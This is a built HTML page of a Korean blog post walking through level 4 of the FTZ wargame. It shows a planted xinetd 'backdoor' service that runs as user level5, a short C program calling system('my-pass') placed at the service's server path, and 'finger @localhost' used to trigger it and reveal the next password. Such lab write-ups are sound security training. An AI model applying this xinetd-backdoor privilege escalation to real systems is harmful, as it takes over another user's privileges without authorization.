@@ -1,0 +1,70 @@
+<!DOCTYPE html><html><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-W055DP4N3J"></script><script>
+					window.dataLayer = window.dataLayer || [];
+					function gtag(){dataLayer.push(arguments);}
+					gtag('js', new Date());
+					gtag('config', 'G-W055DP4N3J');</script><head><meta charSet="utf-8"/><meta name="description" content="기록 저장소"/><meta property="og:description" content="기록 저장소"/><meta property="og:url" content="https://mitny.github.io"/><meta property="og:type" content="website"/><meta property="og:locale" content="ko_KR"/><meta property="og:site_name" content="MitNy.log"/><meta name="viewport" content="initial-scale=1.0, width=device-width"/><title>[FTZ] level 4 |  MitNy.log</title><meta name="robots" content="index,follow"/><meta property="og:title" content="[FTZ] level 4 |  MitNy.log"/><link rel="canonical" href="https://mitny.github.io/articles/2017-09-08-FTZ-level-4"/><meta name="next-head-count" content="12"/><meta name="naver-site-verification" content="b408dee953bcbbb1038384f191f36dac0551c0fb"/><meta name="google-site-verification" content="vUtYhRYNCWYYTdurCRaVmtnWpPLuXKKwRAm5F6R9sNs"/><link rel="preload" href="/_next/static/css/e6a7c67d207b98b3.css" as="style"/><link rel="stylesheet" href="/_next/static/css/e6a7c67d207b98b3.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-69bfa6990bb9e155.js" defer=""></script><script src="/_next/static/chunks/framework-5f4595e5518b5600.js" defer=""></script><script src="/_next/static/chunks/main-005bdf76005efab4.js" defer=""></script><script src="/_next/static/chunks/pages/_app-14a2a9a26060c1d3.js" defer=""></script><script src="/_next/static/chunks/401-9f1400d964d6d7ce.js" defer=""></script><script src="/_next/static/chunks/pages/articles/%5Bdir_slug%5D/%5Bslug%5D-0b7b92862b8a360a.js" defer=""></script><script src="/_next/static/nJPyYqODS0udXw2rMLLyn/_buildManifest.js" defer=""></script><script src="/_next/static/nJPyYqODS0udXw2rMLLyn/_ssgManifest.js" defer=""></script></head><link rel="apple-touch-icon" sizes="57x57" href="/favicon/apple-icon-57x57.png"/><link rel="apple-touch-icon" sizes="60x60" href="/favicon/apple-icon-60x60.png"/><link rel="apple-touch-icon" sizes="72x72" href="/favicon/apple-icon-72x72.png"/><link rel="apple-touch-icon" sizes="76x76" href="/favicon/apple-icon-76x76.png"/><link rel="apple-touch-icon" sizes="114x114" href="/favicon/apple-icon-114x114.png"/><link rel="apple-touch-icon" sizes="120x120" href="/favicon/apple-icon-120x120.png"/><link rel="apple-touch-icon" sizes="144x144" href="/favicon/apple-icon-144x144.png"/><link rel="apple-touch-icon" sizes="152x152" href="/favicon/apple-icon-152x152.png"/><link rel="apple-touch-icon" sizes="180x180" href="/favicon/apple-icon-180x180.png"/><link rel="icon" type="image/png" sizes="192x192" href="/favicon/android-icon-192x192.png"/><link rel="icon" type="image/png" sizes="32x32" href="/favicon/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="96x96" href="/favicon/favicon-96x96.png"/><link rel="icon" type="image/png" sizes="16x16" href="/favicon/favicon-16x16.png"/><link rel="manifest" href="/favicon/manifest.json"/><meta name="msapplication-TileColor" content="#ffffff"/><meta name="msapplication-TileImage" content="/favicon/ms-icon-144x144.png"/><meta name="theme-color" content="#ffffff"/><body><div id="__next" data-reactroot=""><div class="header h-16 bg-white drop-shadow-md text-black"><div class="mx-10 pt-3 cursor-pointer"><p class="header-home text-3xl float-left">MitNy.log</p><p class="text-base font-bold pt-2 float-right">About</p></div></div><div class="mx-10 my-8"><div class="w-full min-h-screen pb-24 mt-8"><div class="w-full min-h-screen pb-24 mt-8"><article class="prose max-w-none"><div class="border-b"><p class="text-4xl font-bold mb-0">[FTZ] level 4</p><p class="text-xs text-neutral-500"></p></div><div><p>id = level4 pw = level4</p>
+<p><img src="/assets/posts/ftz/level4.png" alt=""></p>
+<p>level4 의 hint를 보면 누군가 <code>/etc/xinetd.d/에 백도어를 심어놓았다!</code> 라고 뜬다.
+디렉토리 이동을 하고 파일 목록을 보면 backdoor가 보인다.</p>
+<p><img src="/assets/posts/ftz/xinetd.png" alt=""></p>
+<p>backdoor 파일은 read 할 수 있고, 열어보면 아래와 같이 뜬다.</p>
+<pre class="language-c"><code class="language-c code-highlight"><span class="code-line"><span class="token punctuation">[</span>level4@ftz xinetd<span class="token punctuation">.</span>d<span class="token punctuation">]</span>$ cat backdoor
+</span><span class="code-line">service finger
+</span><span class="code-line"><span class="token punctuation">{</span>
+</span><span class="code-line">	disable	<span class="token operator">=</span> no
+</span><span class="code-line">	flags		<span class="token operator">=</span> REUSE
+</span><span class="code-line">	socket_type	<span class="token operator">=</span> stream
+</span><span class="code-line">	wait		<span class="token operator">=</span> no
+</span><span class="code-line">	user		<span class="token operator">=</span> level5
+</span><span class="code-line">	server		<span class="token operator">=</span> <span class="token operator">/</span>home<span class="token operator">/</span>level4<span class="token operator">/</span>tmp<span class="token operator">/</span>backdoor
+</span><span class="code-line">	log_on_failure	<span class="token operator">+=</span> USERID
+</span><span class="code-line">
+</span><span class="code-line"><span class="token punctuation">}</span>
+</span></code></pre>
+<p>다른 파일들을 열었을때는 이런식으로 service (읽은 파일명) { ... } 인데</p>
+<pre class="language-c"><code class="language-c code-highlight"><span class="code-line"><span class="token punctuation">[</span>level4@ftz xinetd<span class="token punctuation">.</span>d<span class="token punctuation">]</span>$ cat services
+</span><span class="code-line"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">default</span><span class="token expression"><span class="token operator">:</span> off</span></span>
+</span><span class="code-line"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">description</span><span class="token expression"><span class="token operator">:</span> An internal xinetd service<span class="token punctuation">,</span> listing active services<span class="token punctuation">.</span></span></span>
+</span><span class="code-line">service services
+</span><span class="code-line"><span class="token punctuation">{</span>
+</span><span class="code-line">	disable	<span class="token operator">=</span> yes
+</span><span class="code-line">	type		<span class="token operator">=</span> INTERNAL UNLISTED
+</span><span class="code-line">	port		<span class="token operator">=</span> <span class="token number">9098</span>
+</span><span class="code-line">	socket_type	<span class="token operator">=</span> stream
+</span><span class="code-line">	protocol	<span class="token operator">=</span> tcp
+</span><span class="code-line">	wait		<span class="token operator">=</span> no
+</span><span class="code-line">	only_from	<span class="token operator">=</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>
+</span><span class="code-line"><span class="token punctuation">}</span>
+</span></code></pre>
+<p>backdoor는 <code>service finger</code> 가 뜬다.</p>
+<p>그럼 finger를 보자.</p>
+<pre class="language-c"><code class="language-c code-highlight"><span class="code-line"><span class="token punctuation">[</span>level4@ftz xinetd<span class="token punctuation">.</span>d<span class="token punctuation">]</span>$ cat finger
+</span><span class="code-line"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">default</span><span class="token expression"><span class="token operator">:</span> on</span></span>
+</span><span class="code-line"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">description</span><span class="token expression"><span class="token operator">:</span> The finger server answers finger requests<span class="token punctuation">.</span> Finger is </span><span class="token punctuation">\</span>
+</span></span><span class="code-line"><span class="token macro property"><span class="token expression"><span class="token macro property"><span class="token directive-hash">#</span>	<span class="token directive keyword">a</span> <span class="token expression">protocol that allows remote users to see information such </span></span></span><span class="token punctuation">\</span>
+</span></span><span class="code-line"><span class="token macro property"><span class="token expression"><span class="token macro property"><span class="token directive-hash">#</span>	<span class="token directive keyword">as</span> <span class="token expression">login name and last login time <span class="token keyword">for</span> local users<span class="token punctuation">.</span></span></span></span></span>
+</span><span class="code-line">service finger
+</span><span class="code-line"><span class="token punctuation">{</span>
+</span><span class="code-line">	disable	<span class="token operator">=</span> yes
+</span><span class="code-line">	socket_type	<span class="token operator">=</span> stream
+</span><span class="code-line">	wait		<span class="token operator">=</span> no
+</span><span class="code-line">	user		<span class="token operator">=</span> nobody
+</span><span class="code-line">	server		<span class="token operator">=</span> <span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>in<span class="token punctuation">.</span>fingerd
+</span><span class="code-line"><span class="token punctuation">}</span>
+</span></code></pre>
+<p>우선, backdoor의 server 부분  /home/level4/tmp/ 로 이동하면 아무 파일도 없다.
+그럼 이 디렉토리에 level5의 패스워드를 알려주도록 코드를 짜서 backdoor 로 만들면 어떨까</p>
+<pre class="language-c"><code class="language-c code-highlight"><span class="code-line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&#x3C;stdio.h></span></span>
+</span><span class="code-line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&#x3C;stdlib.h></span></span>
+</span><span class="code-line">
+</span><span class="code-line"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+</span><span class="code-line">        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"my-pass"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span><span class="code-line">        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+</span><span class="code-line"><span class="token punctuation">}</span>
+</span></code></pre>
+<p>그냥 backdoor를 실행시켜 버리면 level4의 pw가 뜨므로 소용이 없다.
+finger를 이용해야 하는데, finger 명령어는 리눅스에서 사용자의 계정정보를 확인하는 명령어이다.
+$finger @host명을 입력하면 해당서버에 접속해 있는 모든 유저의 정보를 출력한다.
+그래서 $ finger @localhost 를 입력해 finger 서비스를 실행시키면 된다.</p>
+<p><img src="/assets/posts/ftz/level4_clear.png" alt=""></p>
+<p><code>Level5 Password is "what is your name?".</code></p></div></article></div></div></div><footer class="h-16 bg-neutral-500"></footer></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"slug":"2017-09-08-FTZ-level-4","content":"\nid = level4 pw = level4\n\n![](/assets/posts/ftz/level4.png)\n\nlevel4 의 hint를 보면 누군가 `/etc/xinetd.d/에 백도어를 심어놓았다!` 라고 뜬다.\n디렉토리 이동을 하고 파일 목록을 보면 backdoor가 보인다.\n\n![](/assets/posts/ftz/xinetd.png)\n\nbackdoor 파일은 read 할 수 있고, 열어보면 아래와 같이 뜬다.\n\n```c\n[level4@ftz xinetd.d]$ cat backdoor\nservice finger\n{\n\tdisable\t= no\n\tflags\t\t= REUSE\n\tsocket_type\t= stream\n\twait\t\t= no\n\tuser\t\t= level5\n\tserver\t\t= /home/level4/tmp/backdoor\n\tlog_on_failure\t+= USERID\n\n}\n```\n\n다른 파일들을 열었을때는 이런식으로 service (읽은 파일명) { ... } 인데\n\n```c\n[level4@ftz xinetd.d]$ cat services\n# default: off\n# description: An internal xinetd service, listing active services.\nservice services\n{\n\tdisable\t= yes\n\ttype\t\t= INTERNAL UNLISTED\n\tport\t\t= 9098\n\tsocket_type\t= stream\n\tprotocol\t= tcp\n\twait\t\t= no\n\tonly_from\t= 127.0.0.1\n}\n```\n\nbackdoor는 `service finger` 가 뜬다.\n\n그럼 finger를 보자.\n\n```c\n[level4@ftz xinetd.d]$ cat finger\n# default: on\n# description: The finger server answers finger requests. Finger is \\\n#\ta protocol that allows remote users to see information such \\\n#\tas login name and last login time for local users.\nservice finger\n{\n\tdisable\t= yes\n\tsocket_type\t= stream\n\twait\t\t= no\n\tuser\t\t= nobody\n\tserver\t\t= /usr/sbin/in.fingerd\n}\n```\n\n우선, backdoor의 server 부분  /home/level4/tmp/ 로 이동하면 아무 파일도 없다.\n그럼 이 디렉토리에 level5의 패스워드를 알려주도록 코드를 짜서 backdoor 로 만들면 어떨까\n\n```c\n#include\u003cstdio.h\u003e\n#include\u003cstdlib.h\u003e\n\nint main(void) {\n        system(\"my-pass\");\n        return 0;\n}\n```\n\n그냥 backdoor를 실행시켜 버리면 level4의 pw가 뜨므로 소용이 없다.\nfinger를 이용해야 하는데, finger 명령어는 리눅스에서 사용자의 계정정보를 확인하는 명령어이다.\n$finger @host명을 입력하면 해당서버에 접속해 있는 모든 유저의 정보를 출력한다.\n그래서 $ finger @localhost 를 입력해 finger 서비스를 실행시키면 된다.\n\n![](/assets/posts/ftz/level4_clear.png)\n\n`Level5 Password is \"what is your name?\".`\n","layout":"post","title":"[FTZ] level 4","categories":["FTZ"],"excerpt":" ","comments":true,"share":true,"tags":["FTZ"]}},"__N_SSG":true},"page":"/articles/[dir_slug]/[slug]","query":{"dir_slug":"2017-09","slug":"FTZ-level-4"},"buildId":"nJPyYqODS0udXw2rMLLyn","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>
